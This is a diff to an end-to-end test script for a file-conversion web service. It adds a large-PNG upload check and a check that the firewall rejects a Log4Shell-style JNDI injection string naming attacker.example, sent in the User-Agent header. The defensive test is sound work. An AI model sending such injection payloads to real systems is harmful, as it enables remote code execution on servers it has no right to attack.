@@ -74,4 +74,31 @@ wait_for_job "$JOB3"
 curl -fsL -b "$JAR" -o "$WORK/merged.pdf" "$BASE/jobs/$JOB3/download"
 check_pdf "$WORK/merged.pdf"
 
+say "Converting a 1.5 MB image (large uploads are buffered to disk in /tmp)"
+python3 - "$WORK/large.png" <<'PY'
+import os, struct, sys, zlib
+w = h = 700  # random pixels don't compress, so this is about 1.5 MB
+raw = b"".join(b"\x00" + os.urandom(w * 3) for _ in range(h))
+def chunk(kind, data):
+    return struct.pack(">I", len(data)) + kind + data + struct.pack(">I", zlib.crc32(kind + data) & 0xFFFFFFFF)
+with open(sys.argv[1], "wb") as f:
+    f.write(b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", w, h, 8, 2, 0, 0, 0))
+            + chunk(b"IDAT", zlib.compress(raw, 1)) + chunk(b"IEND", b""))
+PY
+echo "large.png is $(wc -c < "$WORK/large.png") bytes"
+curl -fs -c "$JAR" -b "$JAR" -o /dev/null -F "file=@$WORK/large.png" "$BASE/convert"
+JOB4=$(latest_job_id)
+wait_for_job "$JOB4"
+curl -fsL -b "$JAR" -o "$WORK/large.pdf" "$BASE/jobs/$JOB4/download"
+check_pdf "$WORK/large.pdf"
+
+if [[ "$BASE" == https://* ]]; then
+  say "Checking the WAF blocks a Log4Shell-style attack (AWS only)"
+  CODE=$(curl -s -o /dev/null -w '%{http_code}' -H 'User-Agent: ${jndi:ldap://attacker.example/a}' "$BASE/")
+  if [ "$CODE" != "403" ]; then
+    echo "Expected the WAF to block the request with 403, got $CODE"; exit 1
+  fi
+  echo "WAF blocked the attack (HTTP 403)"
+fi
+
 say "All end-to-end checks passed"
